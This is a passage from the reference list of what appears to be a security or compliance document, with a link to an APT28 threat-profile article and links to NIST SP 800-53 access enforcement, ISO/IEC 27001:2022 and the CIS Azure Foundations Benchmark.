- [APT28 Cyber Threat Profile and TTPs](https://www.picussecurity.com/resource/blog/apt28-cyber-threat-profile-and-detailed-ttps)

### Compliance & Standards
- [NIST SP 800-53 Access Enforcement (AC-3)](https://csrc.nist.gov/pubs/sp/800/53/r5)
- [ISO/IEC 27001:2022 Information Security Management](https://www.iso.org/standard/27001)
- [CIS Microsoft Azure Foundations Benchmark](https://www.cisecurity.org/benchmark/azure)

---